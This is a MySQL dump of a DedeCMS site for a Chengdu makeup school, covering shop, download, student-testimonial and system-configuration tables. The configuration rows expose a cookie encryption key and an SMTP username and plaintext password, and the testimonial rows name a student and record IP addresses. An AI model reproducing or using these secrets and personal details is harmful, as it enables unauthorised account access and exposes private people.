INSERT INTO dede_shops_delivery VALUES ('1', '送货上门', '10.21', '送货上门,领取商品时付费.', '0');
INSERT INTO dede_shops_delivery VALUES ('2', '特快专递（EMS）', '25.00', '特快专递（EMS）,要另收手续费.', '0');
INSERT INTO dede_shops_delivery VALUES ('3', '普通邮递', '5.00', '普通邮递', '0');
INSERT INTO dede_shops_delivery VALUES ('4', '邮局快邮', '12.00', '邮局快邮', '0');

-- ----------------------------
-- Table structure for `dede_shops_orders`
-- ----------------------------
DROP TABLE IF EXISTS `dede_shops_orders`;
CREATE TABLE `dede_shops_orders` (
  `oid` varchar(80) NOT NULL,
  `userid` int(10) NOT NULL,
  `pid` int(10) NOT NULL DEFAULT '0',
  `paytype` tinyint(2) NOT NULL DEFAULT '1',
  `cartcount` int(10) NOT NULL DEFAULT '0',
  `dprice` float(13,2) NOT NULL DEFAULT '0.00',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `priceCount` float(13,2) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `ip` char(15) NOT NULL DEFAULT '',
  `stime` int(10) NOT NULL DEFAULT '0',
  KEY `stime` (`stime`) USING BTREE,
  KEY `userid` (`userid`) USING BTREE,
  KEY `oid` (`oid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_shops_orders
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_shops_products`
-- ----------------------------
DROP TABLE IF EXISTS `dede_shops_products`;
CREATE TABLE `dede_shops_products` (
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `oid` varchar(80) NOT NULL DEFAULT '',
  `userid` int(10) NOT NULL,
  `title` varchar(80) NOT NULL DEFAULT '',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `buynum` int(10) NOT NULL DEFAULT '9',
  KEY `oid` (`oid`) USING BTREE,
  KEY `userid` (`userid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_shops_products
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_shops_userinfo`
-- ----------------------------
DROP TABLE IF EXISTS `dede_shops_userinfo`;
CREATE TABLE `dede_shops_userinfo` (
  `userid` int(10) NOT NULL,
  `oid` varchar(80) NOT NULL DEFAULT '',
  `consignee` char(15) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` int(10) NOT NULL DEFAULT '0',
  `tel` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `des` varchar(255) NOT NULL DEFAULT '',
  KEY `oid` (`oid`) USING BTREE,
  KEY `userid` (`userid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_shops_userinfo
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_softconfig`
-- ----------------------------
DROP TABLE IF EXISTS `dede_softconfig`;
CREATE TABLE `dede_softconfig` (
  `downtype` smallint(6) NOT NULL DEFAULT '0',
  `ismoresite` smallint(6) NOT NULL DEFAULT '0',
  `gotojump` smallint(6) NOT NULL DEFAULT '0',
  `islocal` smallint(5) unsigned NOT NULL DEFAULT '1',
  `sites` text,
  `downmsg` text,
  `moresitedo` smallint(5) unsigned NOT NULL DEFAULT '1',
  `dfrank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `dfywboy` smallint(5) unsigned NOT NULL DEFAULT '0',
  `argrange` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`downtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_softconfig
-- ----------------------------
INSERT INTO dede_softconfig VALUES ('0', '1', '1', '1', 'http://www.aaa.com | 镜像地址一	\nhttp://www.bbb.com | 镜像地址二	\nhttp://www.ccc.com | 镜像地址三	\n', '<p>?推荐使用第三方专业下载工具下载本站软件，使用 WinRAR v3.10 以上版本解压本站软件。<br />	\n?如果这个软件总是不能下载的请点击报告错误,谢谢合作!!<br />	\n?下载本站资源，如果服务器暂不能下载请过一段时间重试！<br />	\n?如果遇到什么问题，请到本站论坛去咨寻，我们将在那里提供更多 、更好的资源！<br />	\n?本站提供的一些商业软件是供学习研究之用，如用于商业用途，请购买正版。</p>', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for `dede_sphinx`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sphinx`;
CREATE TABLE `dede_sphinx` (
  `countid` int(11) unsigned NOT NULL,
  `maxaid` int(11) unsigned NOT NULL,
  PRIMARY KEY (`countid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sphinx
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_stepselect`
-- ----------------------------
DROP TABLE IF EXISTS `dede_stepselect`;
CREATE TABLE `dede_stepselect` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `itemname` char(30) DEFAULT NULL,
  `egroup` char(20) DEFAULT NULL,
  `issign` tinyint(1) unsigned DEFAULT '0',
  `issystem` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_stepselect
-- ----------------------------
INSERT INTO dede_stepselect VALUES ('1', '血型', 'blood', '1', '1');
INSERT INTO dede_stepselect VALUES ('2', '体型', 'bodytype', '1', '1');
INSERT INTO dede_stepselect VALUES ('3', '公司规模', 'cosize', '1', '1');
INSERT INTO dede_stepselect VALUES ('4', '交友', 'datingtype', '1', '1');
INSERT INTO dede_stepselect VALUES ('5', '是否饮酒', 'drink', '1', '1');
INSERT INTO dede_stepselect VALUES ('6', '教育程度', 'education', '1', '1');
INSERT INTO dede_stepselect VALUES ('7', '住房', 'house', '1', '1');
INSERT INTO dede_stepselect VALUES ('8', '收入', 'income', '1', '1');
INSERT INTO dede_stepselect VALUES ('9', '婚姻', 'marital', '1', '1');
INSERT INTO dede_stepselect VALUES ('10', '是否抽烟', 'smoke', '1', '1');
INSERT INTO dede_stepselect VALUES ('11', '星座', 'star', '1', '1');
INSERT INTO dede_stepselect VALUES ('12', '系统缓存标识', 'system', '1', '1');
INSERT INTO dede_stepselect VALUES ('13', '行业', 'vocation', '2', '0');
INSERT INTO dede_stepselect VALUES ('14', '地区', 'nativeplace', '2', '0');
INSERT INTO dede_stepselect VALUES ('15', '信息类型', 'infotype', '2', '0');

-- ----------------------------
-- Table structure for `dede_stu`
-- ----------------------------
DROP TABLE IF EXISTS `dede_stu`;
CREATE TABLE `dede_stu` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `leavetime` int(11) NOT NULL DEFAULT '0',
  `pic2` varchar(250) NOT NULL DEFAULT '',
  `xxxx` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_stu
-- ----------------------------
INSERT INTO dede_stu VALUES ('52', '22', '', '', '222.211.124.86', '1429154859', '/uploads/150417/1-15041G602405J.png', '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(0, 0, 0); font-family: Simsun; font-size: 13.63636302947998px; line-height: 20px; text-indent: 28px;\">三个月前，带着懵懂踏入群丽，对这个新奇的环境充满了好奇与期待，渴望能在这里通过学习，磨练自己，提成自己的能力，不断刷新对自己的认识，在这三个月里我结交了许多朋友，伙伴，我们共同怀揣着梦想，相互帮助，相互支持到今天，回头看看我们共同走过的日子。都是无比珍惜的回忆。</span>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 13.63636302947998px; text-indent: 28px; color: rgb(0, 0, 0); font-family: Simsun; line-height: 20px;\">\r\n	参加大型活动：军旅联创，杂志拍摄。同样，也是老师们操劳的结果，在这里要感谢各位老师，感谢你们这段日子里对我们无微不至的关心与帮组，让我不仅仅学到了生存的技能，更多的教会我们怎样做人。</p>\r\n');
INSERT INTO dede_stu VALUES ('58', '22', '', '', '222.211.124.86', '1429155660', '/uploads/150417/1-15041G64304F8.png', '<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	姓名：廖雪梅</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	毕业学校：<span style=\"margin: 0px; padding: 0px; border: none; font-size: 16px; font-family: 微软雅黑, \'microsoft yahei\';\">群丽摄影和形象设计职业技能培训学校</span></div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	毕业年度、班级：2013年6月 &nbsp; &nbsp; 班主任：小雪</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	性格：活泼、开朗、执着、独立</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	爱好：绘画、看书、看电影、关实时资讯</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	座右铭、人生格言：当你最困难的时候就是离成功不远的时候，如果你遇到困难就后退，那就算成功已到彼岸，它也会与你无缘。</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	就业感受：从事化妆工作大半年以来，得到了所被服务顾客的赞赏与认同。获得了经济收益的同时，又实现了自身价值是让本人最具幸福感的事。</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	现从事职业：独立经营一家真情美甲店</div>\r\n<div style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px; text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/150416/1-150416114231961.png\" style=\"width: 687px; height: 942px;\" /></div>\r\n');
INSERT INTO dede_stu VALUES ('61', '22', '', '', '222.211.124.86', '1429156175', '/uploads/150417/1-15041G6342Lc.png', '<img alt=\"\" src=\"/uploads/150416/1-150416115130344.jpg\" style=\"width: 597px; height: 800px;\" />');
INSERT INTO dede_stu VALUES ('88', '22', '', '', '222.211.124.86', '1429260410', '/uploads/150417/1-15041GA014X6.png', '<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/150417/1-15041GA049420.jpg\" /><br />\r\n	<img alt=\"\" src=\"/uploads/150417/1-15041GA131117.jpg\" /></div>\r\n');
INSERT INTO dede_stu VALUES ('89', '22', '', '', '222.211.124.86', '1429260812', '/uploads/150417/1-15041GA540191.png', '<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/150417/1-15041GA614U0.png\" /></div>\r\n');

-- ----------------------------
-- Table structure for `dede_sysconfig`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sysconfig`;
CREATE TABLE `dede_sysconfig` (
  `aid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `varname` varchar(20) NOT NULL DEFAULT '',
  `info` varchar(100) NOT NULL DEFAULT '',
  `groupid` smallint(6) NOT NULL DEFAULT '1',
  `type` varchar(10) NOT NULL DEFAULT 'string',
  `value` text,
  PRIMARY KEY (`varname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sysconfig
-- ----------------------------
INSERT INTO dede_sysconfig VALUES ('1', 'cfg_basehost', '站点根网址', '1', 'string', 'http://home.qunli.com');
INSERT INTO dede_sysconfig VALUES ('2', 'cfg_cmspath', 'DedeCMS安装目录', '2', 'string', '');
INSERT INTO dede_sysconfig VALUES ('3', 'cfg_cookie_encode', 'cookie加密码', '2', 'string', 'cUthCg1DhLWVIDQhv7gncLVDXwGIfuW');
INSERT INTO dede_sysconfig VALUES ('4', 'cfg_indexurl', '网页主页链接', '1', 'string', '/');
INSERT INTO dede_sysconfig VALUES ('5', 'cfg_backup_dir', '数据备份目录（在data目录内）', '2', 'string', 'backupdata');
INSERT INTO dede_sysconfig VALUES ('6', 'cfg_indexname', '主页链接名', '1', 'string', '主页');
INSERT INTO dede_sysconfig VALUES ('7', 'cfg_webname', '网站名称', '1', 'string', '群丽化妆学校');
INSERT INTO dede_sysconfig VALUES ('8', 'cfg_adminemail', '网站发信EMAIL', '2', 'string', 'admin@dedecms.com');
INSERT INTO dede_sysconfig VALUES ('9', 'cfg_html_editor', 'Html编辑器（ckeditor,需要fck的用户可以去官网下载）', '2', 'string', 'ckeditor');
INSERT INTO dede_sysconfig VALUES ('10', 'cfg_arcdir', '文档HTML默认保存路径', '1', 'string', '/a');
INSERT INTO dede_sysconfig VALUES ('11', 'cfg_medias_dir', '图片/上传文件默认路径', '1', 'string', '/uploads');
INSERT INTO dede_sysconfig VALUES ('12', 'cfg_ddimg_width', '缩略图默认宽度', '3', 'number', '240');
INSERT INTO dede_sysconfig VALUES ('13', 'cfg_ddimg_height', '缩略图默认高度', '3', 'number', '180');
INSERT INTO dede_sysconfig VALUES ('63', 'cfg_album_width', '图集默认显示图片的大小', '3', 'number', '800');
INSERT INTO dede_sysconfig VALUES ('15', 'cfg_imgtype', '图片浏览器文件类型', '3', 'string', 'jpg|gif|png');
INSERT INTO dede_sysconfig VALUES ('16', 'cfg_softtype', '允许上传的软件类型', '3', 'bstring', 'zip|gz|rar|iso|doc|xsl|ppt|wps');
INSERT INTO dede_sysconfig VALUES ('17', 'cfg_mediatype', '允许的多媒体文件类型', '3', 'bstring', 'swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov');
INSERT INTO dede_sysconfig VALUES ('18', 'cfg_specnote', '专题的最大节点数', '2', 'number', '6');
INSERT INTO dede_sysconfig VALUES ('19', 'cfg_list_symbol', '栏目位置的间隔符号', '2', 'string', ' > ');
INSERT INTO dede_sysconfig VALUES ('20', 'cfg_notallowstr', '禁用词语（系统将直接停止用户动作）<br/>用|分开，但不要在结尾加|', '5', 'bstring', '非典|艾滋病|阳痿');
INSERT INTO dede_sysconfig VALUES ('21', 'cfg_feedbackcheck', '评论及留言(是/否)需审核', '5', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('22', 'cfg_keyword_replace', '关键字替换(是/否)使用本功能会影响HTML生成速度', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('23', 'cfg_fck_xhtml', '编辑器(是/否)使用XHTML', '1', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('24', 'cfg_df_style', '模板默认风格', '1', 'string', 'qunli');
INSERT INTO dede_sysconfig VALUES ('25', 'cfg_multi_site', '(是/否)支持多站点，开启此项后附件、栏目连接、arclist内容启用绝对网址', '2', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('58', 'cfg_rm_remote', '远程图片本地化', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('27', 'cfg_dede_log', '(是/否)开启管理日志', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('28', 'cfg_powerby', '网站版权信息', '1', 'bstring', '地址：成都市春熙路城守东大街6号蓝光大厦5楼（西南书城旁） 电话：028-8666 1825/028-8666 1640 QQ：610606820 网站法律顾问：\r\nCopyright © 1996-2015 群丽化妆学校(www.ql-school.com) 版权所有 All Rights Reserved 未经许可禁止转载本站内容 \r\n版权所有：群丽集团旗下群丽摄影和形象设计职业技能培训学校 备案号：蜀ICP备12003384号-1');
INSERT INTO dede_sysconfig VALUES ('722', 'cfg_jump_once', '跳转网址是否直接跳转？（否则显示中转页）', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('723', 'cfg_task_pwd', '系统计划任务客户端许可密码<br/>(需要客户端，通常不会太重要)', '7', 'string', '');
INSERT INTO dede_sysconfig VALUES ('29', 'cfg_arcsptitle', '(是/否)开启分页标题，开启会影响HTML生成速度', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('30', 'cfg_arcautosp', '(是/否)开启长文章自动分页', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('31', 'cfg_arcautosp_size', '文章自动分页大小（单位: K）', '6', 'number', '5');
INSERT INTO dede_sysconfig VALUES ('32', 'cfg_auot_description', '自动摘要长度（0-250，0表示不启用）', '7', 'number', '240');
INSERT INTO dede_sysconfig VALUES ('33', 'cfg_ftp_host', 'FTP主机', '2', 'string', '');
INSERT INTO dede_sysconfig VALUES ('34', 'cfg_ftp_port', 'FTP端口', '2', 'number', '21');
INSERT INTO dede_sysconfig VALUES ('35', 'cfg_ftp_user', 'FTP用户名', '2', 'string', '');
INSERT INTO dede_sysconfig VALUES ('36', 'cfg_ftp_pwd', 'FTP密码', '2', 'string', '');
INSERT INTO dede_sysconfig VALUES ('37', 'cfg_ftp_root', '网站根在FTP中的目录', '2', 'string', '/');
INSERT INTO dede_sysconfig VALUES ('38', 'cfg_ftp_mkdir', '是否强制用FTP创建目录', '2', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('39', 'cfg_feedback_ck', '评论加验证码重确认', '5', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('40', 'cfg_list_son', '上级列表是否包含子类内容', '6', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('41', 'cfg_mb_open', '是否开启会员功能', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('42', 'cfg_mb_album', '是否开启会员图集功能', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('43', 'cfg_mb_upload', '是否允许会员上传非图片附件', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('44', 'cfg_mb_upload_size', '会员上传文件大小(K)', '4', 'number', '1024');
INSERT INTO dede_sysconfig VALUES ('45', 'cfg_mb_sendall', '是否开放会员对自定义模型投稿', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('46', 'cfg_mb_rmdown', '是否把会员指定的远程文档下载到本地', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('47', 'cfg_cli_time', '服务器时区设置', '2', 'number', '8');
INSERT INTO dede_sysconfig VALUES ('48', 'cfg_mb_addontype', '会员附件许可的类型', '4', 'bstring', 'swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|zip|rar|doc|xsl|ppt|wps');
INSERT INTO dede_sysconfig VALUES ('49', 'cfg_mb_max', '会员附件总大小限制(MB)', '4', 'number', '500');
INSERT INTO dede_sysconfig VALUES ('20', 'cfg_replacestr', '替换词语（词语会被替换成***）<br/>用|分开，但不要在结尾加|', '5', 'bstring', '她妈|它妈|他妈|你妈|去死|贱人');
INSERT INTO dede_sysconfig VALUES ('719', 'cfg_makeindex', '发布文章后马上更新网站主页', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('51', 'cfg_keyword_like', '使用关键词关连文章', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('52', 'cfg_index_max', '网站主页调用函数最大索引文档数<br>不适用于经常单栏目采集过多内容的网站<br>不启用本项此值设置为0即可', '6', 'number', '10000');
INSERT INTO dede_sysconfig VALUES ('53', 'cfg_index_cache', 'arclist标签调用缓存<br />(0 不启用，大于0值为多少秒)', '6', 'number', '86400');
INSERT INTO dede_sysconfig VALUES ('54', 'cfg_tplcache', '是否启用模板缓存', '6', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('55', 'cfg_tplcache_dir', '模板缓存目录', '6', 'string', '/data/tplcache');
INSERT INTO dede_sysconfig VALUES ('56', 'cfg_makesign_cache', '发布/修改单个文档是否使用调用缓存', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('59', 'cfg_arc_dellink', '删除非站内链接', '7', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('60', 'cfg_arc_autopic', '提取第一张图片作为缩略图', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('61', 'cfg_arc_autokeyword', '自动提取关键字', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('62', 'cfg_title_maxlen', '文档标题最大长度<br>改此参数后需要手工修改数据表', '7', 'number', '60');
INSERT INTO dede_sysconfig VALUES ('64', 'cfg_check_title', '发布文档时是否检测重复标题', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('65', 'cfg_album_row', '图集多行多列样式默认行数', '3', 'number', '3');
INSERT INTO dede_sysconfig VALUES ('66', 'cfg_album_col', '图集多行多列样式默认列数', '3', 'number', '4');
INSERT INTO dede_sysconfig VALUES ('67', 'cfg_album_pagesize', '图集多页多图每页显示最大数', '3', 'number', '12');
INSERT INTO dede_sysconfig VALUES ('68', 'cfg_album_style', '图集默认样式<br />1为多页多图,2为多页单图,3为缩略图列表', '3', 'number', '2');
INSERT INTO dede_sysconfig VALUES ('69', 'cfg_album_ddwidth', '图集默认缩略图大小', '3', 'number', '200');
INSERT INTO dede_sysconfig VALUES ('70', 'cfg_mb_notallow', '不允许注册的会员id', '4', 'bstring', 'www,bbs,ftp,mail,user,users,admin,administrator');
INSERT INTO dede_sysconfig VALUES ('71', 'cfg_mb_idmin', '用户id最小长度', '4', 'number', '3');
INSERT INTO dede_sysconfig VALUES ('72', 'cfg_mb_pwdmin', '用户密码最小长度', '4', 'number', '3');
INSERT INTO dede_sysconfig VALUES ('73', 'cfg_md_idurl', '是否严格限定会员登录id<br>允许会员使用二级域名必须设置此项', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('74', 'cfg_mb_rank', '注册会员默认级别<br>[会员权限管理中]查看级别代表的数字', '4', 'number', '10');
INSERT INTO dede_sysconfig VALUES ('76', 'cfg_feedback_time', '两次评论至少间隔时间(秒钟)', '5', 'number', '30');
INSERT INTO dede_sysconfig VALUES ('77', 'cfg_feedback_numip', '每个IP一小时内最大评论数', '5', 'number', '30');
INSERT INTO dede_sysconfig VALUES ('78', 'cfg_md_mailtest', '是否限制Email只能注册一个帐号', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('79', 'cfg_mb_spacesta', '会员使用权限开通状态<br>(-10 邮件验证 -1 手工审核, 0 没限制)', '4', 'number', '-10');
INSERT INTO dede_sysconfig VALUES ('728', 'cfg_mb_allowreg', '是否允许新会员注册', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('729', 'cfg_mb_adminlock', '是否禁止访问管理员帐号的空间', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('81', 'cfg_vdcode_member', '会员投稿是否使用验证码', '5', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('83', 'cfg_mb_cktitle', '会员投稿是否检测重复标题', '5', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('84', 'cfg_mb_editday', '投稿多长时间后不能再修改[天]', '5', 'number', '7');
INSERT INTO dede_sysconfig VALUES ('729', 'cfg_sendarc_scores', '投稿可获取积分', '5', 'number', '10');
INSERT INTO dede_sysconfig VALUES ('88', 'cfg_caicai_sub', '被踩扣除文章好评度', '5', 'number', '2');
INSERT INTO dede_sysconfig VALUES ('89', 'cfg_caicai_add', '被顶扣除文章好评度', '5', 'number', '2');
INSERT INTO dede_sysconfig VALUES ('90', 'cfg_feedback_add', '详细好评可获好评度', '5', 'number', '5');
INSERT INTO dede_sysconfig VALUES ('91', 'cfg_feedback_sub', '详细恶评扣除好评度', '5', 'number', '5');
INSERT INTO dede_sysconfig VALUES ('730', 'cfg_sendfb_scores', '参与评论可获积分', '5', 'number', '3');
INSERT INTO dede_sysconfig VALUES ('92', 'cfg_search_max', '最大搜索检查文档数', '6', 'number', '50000');
INSERT INTO dede_sysconfig VALUES ('93', 'cfg_search_maxrc', '最大返回搜索结果数', '6', 'number', '300');
INSERT INTO dede_sysconfig VALUES ('94', 'cfg_search_time', '搜索间隔时间(秒/对网站所有用户)', '6', 'number', '3');
INSERT INTO dede_sysconfig VALUES ('95', 'cfg_baidunews_limit', '百度新闻xml更新新闻数量 最大100', '8', 'string', '100');
INSERT INTO dede_sysconfig VALUES ('223', 'cfg_smtp_port', 'smtp服务器端口', '2', 'string', '25');
INSERT INTO dede_sysconfig VALUES ('221', 'cfg_sendmail_bysmtp', '是否启用smtp方式发送邮件', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('222', 'cfg_smtp_server', 'smtp服务器', '2', 'string', 'smtp.qq.com');
INSERT INTO dede_sysconfig VALUES ('224', 'cfg_smtp_usermail', 'SMTP服务器的用户邮箱', '2', 'string', 'desdev@vip.qq.com');
INSERT INTO dede_sysconfig VALUES ('225', 'cfg_smtp_user', 'SMTP服务器的用户帐号', '2', 'string', 'desdev');
INSERT INTO dede_sysconfig VALUES ('226', 'cfg_smtp_password', 'SMTP服务器的用户密码', '2', 'string', '7260444huxiao');
INSERT INTO dede_sysconfig VALUES ('96', 'cfg_updateperi', '百度新闻xml更新时间 （单位：分钟）', '8', 'string', '15');
INSERT INTO dede_sysconfig VALUES ('227', 'cfg_online_type', '在线支付网关类型', '2', 'string', 'nps');
INSERT INTO dede_sysconfig VALUES ('706', 'cfg_upload_switch', '删除文章文件同时删除相关附件文件', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('708', 'cfg_rewrite', '是否使用伪静态', '2', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('707', 'cfg_allsearch_limit', '网站全局搜索时间限制', '2', 'string', '1');
INSERT INTO dede_sysconfig VALUES ('709', 'cfg_delete', '文章回收站(是/否)开启', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('710', 'cfg_keywords', '站点默认关键字', '1', 'string', '成都化妆学校,群丽化妆学校,成都化妆培训,成都群丽化妆学校,成都化妆培训学校哪家好');
INSERT INTO dede_sysconfig VALUES ('711', 'cfg_description', '站点描述', '1', 'bstring', '');
INSERT INTO dede_sysconfig VALUES ('712', 'cfg_beian', '网站备案号', '1', 'string', '蜀ICP备12003384号-1');
INSERT INTO dede_sysconfig VALUES ('713', 'cfg_need_typeid2', '是否启用副栏目', '6', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('72', 'cfg_mb_pwdtype', '前台密码验证类型：默认32 — 32位md5，可选：<br />l16 — 前16位， r16 — 后16位， m16 — 中间16位', '4', 'string', '32');
INSERT INTO dede_sysconfig VALUES ('716', 'cfg_cache_type', 'id 文档ID，content 标签最终内容<br />(修改此变量后必须更新系统缓存)', '6', 'string', 'id');
INSERT INTO dede_sysconfig VALUES ('717', 'cfg_max_face', '会员上传头像大小限制(单位：KB)', '3', 'number', '50');
INSERT INTO dede_sysconfig VALUES ('718', 'cfg_typedir_df', '栏目网址使用目录名（不显示默认页，即是 /a/abc/ 形式）', '2', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('719', 'cfg_make_andcat', '发表文章后马上更新相关栏目', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('720', 'cfg_make_prenext', '发表文章后马上更新上下篇', '6', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('721', 'cfg_feedback_forbid', '是否禁止所有评论(将包括禁止顶踩等)', '5', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('724', 'cfg_addon_domainbind', '附件目录是否绑定为指定的二级域名', '7', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('725', 'cfg_addon_domain', '附件目录的二级域名', '7', 'string', '');
INSERT INTO dede_sysconfig VALUES ('726', 'cfg_df_dutyadmin', '默认责任编辑(dutyadmin)', '7', 'string', 'admin');
INSERT INTO dede_sysconfig VALUES ('727', 'cfg_mb_allowncarc', '是否允许用户空间显示未审核文章', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('730', 'cfg_mb_spaceallarc', '会员空间中所有文档的频道ID(不限为0)', '4', 'number', '0');
INSERT INTO dede_sysconfig VALUES ('731', 'cfg_face_adds', '上传头像增加积分', '5', 'number', '10');
INSERT INTO dede_sysconfig VALUES ('732', 'cfg_moreinfo_adds', '填写详细资料增加积分', '5', 'number', '20');
INSERT INTO dede_sysconfig VALUES ('733', 'cfg_money_scores', '多少积分可以兑换一个金币', '5', 'number', '50');
INSERT INTO dede_sysconfig VALUES ('734', 'cfg_mb_wnameone', '是否允许用户笔名/昵称重复', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('735', 'cfg_arc_dirname', '是否允许用目录作为文档文件名<br />文档命名规则需改为：{typedir}/{aid}/index.html', '7', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('736', 'cfg_puccache_time', '需缓存内容全局缓存时间(秒)', '6', 'number', '36000');
INSERT INTO dede_sysconfig VALUES ('737', 'cfg_arc_click', '文档默认点击数(-1表示随机50-200)', '7', 'number', '-1');
INSERT INTO dede_sysconfig VALUES ('738', 'cfg_addon_savetype', '附件保存形式(按data函数日期参数)', '3', 'string', 'ymd');
INSERT INTO dede_sysconfig VALUES ('739', 'cfg_qk_uploadlit', '异步上传缩略图(空间太不稳定的用户关闭此项)', '3', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('740', 'cfg_login_adds', '登录会员中心获积分', '5', 'number', '2');
